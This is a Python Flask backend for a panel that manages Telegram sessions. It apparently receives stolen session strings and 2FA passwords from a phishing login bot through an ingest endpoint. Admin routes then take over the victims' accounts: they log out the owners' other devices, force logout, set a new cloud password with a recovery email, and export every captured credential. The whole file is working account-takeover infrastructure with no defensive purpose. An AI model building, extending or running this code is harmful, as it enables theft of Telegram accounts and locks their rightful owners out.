"""Manager — Flask backend.

Provides:
- Admin login (single password, session-cookie based)
- Sessions CRUD + audit
- Telegram device management via Telethon
- 2FA setup / status
- Auto-logout settings
- Ingest endpoint to receive captured sessions from the login bot (matches your reference app)
"""
import os
import json
import time
import secrets
import logging
import threading
from flask import Flask, request, jsonify, send_from_directory, session, g
from flask_cors import CORS
from dotenv import load_dotenv
from functools import wraps

import db
import telegram_ops
import auto_logout

load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_DIR = os.path.join(BASE_DIR, "static")
PORT = int(os.getenv("PORT", "5001"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("manager")

app = Flask(__name__, static_folder=STATIC_DIR)
app.secret_key = os.getenv("SECRET_KEY", secrets.token_hex(32))
app.permanent_session = True  # 31-day cookie
CORS(app)

# Ephemeral in-memory store mirroring your reference bot's flow (phone -> {client, hash}).
# Manager reuses this so it can act as the login endpoint as well.
pending_logins = {}


# ---------- auth middleware ----------
def admin_required(fn):
    @wraps(fn)
    def wrap(*a, **kw):
        if not session.get("admin"):
            return jsonify({"error": "unauthorized"}), 401
        return fn(*a, **kw)

    return wrap


@app.before_request
def _init():
    if not getattr(g, "_db_ready", False):
        db.init_db()
        g._db_ready = True


# ---------- static ----------
@app.route("/")
def index():
    if not session.get("admin"):
        return send_from_directory(STATIC_DIR, "login.html")
    return send_from_directory(STATIC_DIR, "index.html")


@app.route("/<path:path>")
def static_files(path):
    return send_from_directory(STATIC_DIR, path)


# ---------- auth ----------
@app.route("/api/login", methods=["POST"])
def api_login():
    pwd = (request.json or {}).get("password", "")
    if pwd and pwd == db.get_setting("admin_password"):
        session.permanent = True
        session["admin"] = True
        return jsonify({"ok": True})
    return jsonify({"error": "wrong password"}), 401


@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"ok": True})


@app.route("/api/me")
def api_me():
    return jsonify({"admin": bool(session.get("admin"))})


# ---------- ingest: receive captured session from login bot ----------
@app.route("/api/ingest", methods=["POST"])
def api_ingest():
    """
    Body: { phone, user_id, username, name, session_string, twofa_password }
    Compatible with your reference bot's verify_op() return shape — just POST it here.
    Optionally protected by INGEST_TOKEN env var.
    """
    tok = os.getenv("INGEST_TOKEN", "")
    if tok:
        auth = request.headers.get("X-Ingest-Token", "")
        if auth != tok:
            return jsonify({"error": "forbidden"}), 403
    data = request.json or {}
    if not data.get("phone") or not data.get("session_string"):
        return jsonify({"error": "missing fields"}), 400
    row = db.insert_session(data)
    return jsonify({"ok": True, "id": row["id"]})


# ---------- sessions ----------
@app.route("/api/sessions")
@admin_required
def api_sessions():
    rows = db.list_sessions()
    out = []
    for r in rows:
        out.append(
            {
                "id": r["id"],
                "phone": r["phone"],
                "user_id": r["user_id"],
                "username": r["username"],
                "name": r["name"],
                "email": r["email"],
                "is_protected": bool(r["is_protected"]),
                "is_current": bool(r["is_current"]),
                "has_2fa_pw": bool(r["twofa_password"]),
                "created_at": r["created_at"],
                "last_seen": r["last_seen"],
                "auto_logout_at": r["auto_logout_at"],
                "auto_logout_fired": bool(r["auto_logout_fired"]),
                "notes": r["notes"],
                "last_action": r["last_action"],
                "last_action_at": r["last_action_at"],
            }
        )
    return jsonify(out)


@app.route("/api/sessions/<int:sid>")
@admin_required
def api_session_detail(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    return jsonify(
        {
            "id": r["id"],
            "phone": r["phone"],
            "user_id": r["user_id"],
            "username": r["username"],
            "name": r["name"],
            "email": r["email"],
            "session_string": r["session_string"],
            "twofa_password": r["twofa_password"],
            "is_protected": bool(r["is_protected"]),
            "is_current": bool(r["is_current"]),
            "created_at": r["created_at"],
            "last_seen": r["last_seen"],
            "auto_logout_at": r["auto_logout_at"],
            "auto_logout_fired": bool(r["auto_logout_fired"]),
            "notes": r["notes"],
        }
    )


@app.route("/api/sessions/<int:sid>", methods=["DELETE"])
@admin_required
def api_session_delete(sid):
    db.delete_session(sid)
    return jsonify({"ok": True})


@app.route("/api/sessions/<int:sid>/protect", methods=["POST"])
@admin_required
def api_protect(sid):
    val = bool((request.json or {}).get("value", True))
    db.set_protected(sid, val)
    return jsonify({"ok": True, "is_protected": val})


@app.route("/api/sessions/<int:sid>/current", methods=["POST"])
@admin_required
def api_current(sid):
    val = bool((request.json or {}).get("value", True))
    db.set_current(sid, val)
    return jsonify({"ok": True, "is_current": val})


@app.route("/api/sessions/<int:sid>/mail", methods=["POST"])
@admin_required
def api_mail(sid):
    email = (request.json or {}).get("email", "")
    db.set_email(sid, email)
    return jsonify({"ok": True})


@app.route("/api/sessions/<int:sid>/notes", methods=["POST"])
@admin_required
def api_notes(sid):
    notes = (request.json or {}).get("notes", "")
    db.set_notes(sid, notes)
    return jsonify({"ok": True})


# ---------- telegram ops ----------
@app.route("/api/sessions/<int:sid>/devices")
@admin_required
def api_devices(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.list_devices(r)
        if "error" in res:
            return jsonify(res), 400
        db.touch_last_seen(sid)
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/logout-device", methods=["POST"])
@admin_required
def api_logout_device(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    h = (request.json or {}).get("hash")
    if h is None:
        return jsonify({"error": "hash required"}), 400
    try:
        res = telegram_ops.logout_device(r, int(h))
        db.audit(sid, r["phone"], "device_logout", f"hash={h}")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/logout-others", methods=["POST"])
@admin_required
def api_logout_others(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.logout_all_others(r)
        db.audit(sid, r["phone"], "logout_others", f"killed={res.get('killed', 0)}")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/force-logout", methods=["POST"])
@admin_required
def api_force_logout(sid):
    """Kill ALL authorizations on this account (including the one this session_string came from)."""
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.force_logout_account(r)
        db.update_session(sid, {"last_action": "force_logout", "last_action_at": int(time.time())})
        db.audit(sid, r["phone"], "force_logout", f"killed={res.get('killed', 0)}")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/2fa-status")
@admin_required
def api_2fa_status(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    try:
        res = telegram_ops.get_2fa_status(r)
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/sessions/<int:sid>/2fa", methods=["POST"])
@admin_required
def api_2fa_set(sid):
    r = db.get_session(sid)
    if not r:
        return jsonify({"error": "not found"}), 404
    body = request.json or {}
    try:
        res = telegram_ops.set_2fa(
            r,
            body.get("new_password", ""),
            body.get("hint", ""),
            body.get("recovery_email", ""),
            body.get("current_password", ""),
        )
        if res.get("success"):
            db.update_session(sid, {"twofa_password": body.get("new_password", "") or r["twofa_password"]})
            db.audit(sid, r["phone"], "2fa_set", "Updated cloud password")
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ---------- settings ----------
@app.route("/api/settings")
@admin_required
def api_settings():
    s = db.get_all_settings()
    return jsonify(
        {
            "auto_logout_enabled": s.get("auto_logout_enabled") == "1",
            "auto_logout_hours": int(s.get("auto_logout_hours", "24")),
            "admin_password_set": bool(s.get("admin_password")),
            "api_id": s.get("api_id", ""),
            "api_hash": s.get("api_hash", ""),
            "bot_token": s.get("bot_token", ""),
            "log_channel_id": s.get("log_channel_id", ""),
        }
    )


@app.route("/api/settings", methods=["POST"])
@admin_required
def api_settings_save():
    body = request.json or {}
    if "auto_logout_enabled" in body:
        db.set_setting("auto_logout_enabled", "1" if body["auto_logout_enabled"] else "0")
        if body["auto_logout_enabled"]:
            # backfill pending timers for sessions that don't have one yet
            hours = int(db.get_setting("auto_logout_hours", "24"))
            now = int(time.time())
            for r in db.list_sessions():
                if not r["auto_logout_at"] and not r["auto_logout_fired"]:
                    db.update_session(r["id"], {"auto_logout_at": now + hours * 3600})
    if "auto_logout_hours" in body:
        db.set_setting("auto_logout_hours", str(int(body["auto_logout_hours"])))
    if body.get("admin_password"):
        db.set_setting("admin_password", body["admin_password"])
    if "api_id" in body:
        db.set_setting("api_id", str(body["api_id"]))
    if "api_hash" in body:
        db.set_setting("api_hash", str(body["api_hash"]))
    if "bot_token" in body:
        db.set_setting("bot_token", str(body["bot_token"]))
    if "log_channel_id" in body:
        db.set_setting("log_channel_id", str(body["log_channel_id"]))
    return jsonify({"ok": True})


# ---------- audit ----------
@app.route("/api/audit")
@admin_required
def api_audit():
    limit = int(request.args.get("limit", "100"))
    rows = db.list_audit(limit)
    return jsonify([dict(r) for r in rows])


# ---------- dashboard ----------
@app.route("/api/dashboard")
@admin_required
def api_dashboard():
    rows = db.list_sessions()
    now = int(time.time())
    today = now - 86400
    return jsonify(
        {
            "total": len(rows),
            "today": sum(1 for r in rows if r["created_at"] and r["created_at"] >= today),
            "protected": sum(1 for r in rows if r["is_protected"]),
            "has_2fa_pw": sum(1 for r in rows if r["twofa_password"]),
            "pending_auto_logout": sum(
                1 for r in rows if r["auto_logout_at"] and not r["auto_logout_fired"] and r["auto_logout_at"] > now
            ),
            "auto_logout_enabled": db.get_setting("auto_logout_enabled") == "1",
        }
    )


# ---------- export ----------
@app.route("/api/export")
@admin_required
def api_export():
    rows = db.list_sessions()
    out = []
    for r in rows:
        out.append({k: r[k] for k in r.keys()})
    return jsonify(out)


if __name__ == "__main__":
    db.init_db()
    auto_logout.start()
    logger.info(f"Manager running on http://0.0.0.0:{PORT}")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
